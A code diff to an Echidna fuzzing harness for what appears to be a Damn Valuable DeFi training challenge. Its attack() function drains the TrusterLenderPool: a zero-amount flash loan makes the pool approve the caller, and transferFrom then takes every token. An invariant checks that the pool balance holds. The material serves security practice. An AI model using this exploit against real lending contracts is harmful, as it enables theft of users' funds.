@@ -8,7 +8,7 @@ import "./DamnValuableToken.sol";
 ///      ```
 ///      cd repo
 ///      solc-select use 0.8.0
-///      echidna contracts/naive-receiver/Invariants.sol --contract InvariantTests --config contracts/naive-receiver/config.yaml
+///      echidna src/Invariants.sol --contract InvariantTests --config src/config.yaml
 ///      ```
 contract InvariantTests {
     using Address for address payable;
@@ -19,42 +19,54 @@ contract InvariantTests {
     DamnValuableToken valuableToken;
 
     constructor() {
-        (valuableToken, lenderPool) = Deployer.deploy();
-
         // deploy token
         // deploy pool
         // deal balance to pool
+        Deployer deployer = new Deployer();
+        (valuableToken, lenderPool) = deployer.deploy(FLASH_LOAN_POOL_AMOUNT);
     }
 
     // write attack function
-    function attack(uint256 amount) external {
+    function attack() external {
         lenderPool.flashLoan(
             0,
             address(this),
             address(valuableToken),
             abi.encodeWithSignature(
                 "approve(address,uint256)", //@audit-info no spaces between args
-                address(owner),
-                amount
+                address(this),
+                FLASH_LOAN_POOL_AMOUNT
             )
         );
 
-        valuableToken.transferFrom(address(lenderPool), address(owner), amount);
+        valuableToken.transferFrom(
+            address(lenderPool),
+            msg.sender,
+            FLASH_LOAN_POOL_AMOUNT
+        );
     }
 
-    function echidna_test_receiver_balance_cannot_decrease()
+    function echidna_lender_balance_cannot_decrease()
         public
         view
         returns (bool)
     {
-        return true;
+        return
+            valuableToken.balanceOf(address(lenderPool)) >=
+            FLASH_LOAN_POOL_AMOUNT;
     }
 }
 
 contract Deployer {
-    function deploy() external returns (DamnValuableToken, TrusterLenderPool) {
-        valuableToken = new DamnValuableToken();
-        lenderPool = new TrusterLenderPool(address(valuableToken));
+    function deploy(
+        uint256 amount
+    ) external returns (DamnValuableToken, TrusterLenderPool) {
+        DamnValuableToken valuableToken = new DamnValuableToken();
+        TrusterLenderPool lenderPool = new TrusterLenderPool(
+            address(valuableToken)
+        );
+
+        valuableToken.transfer(address(lenderPool), amount);
 
         return (valuableToken, lenderPool);
     }
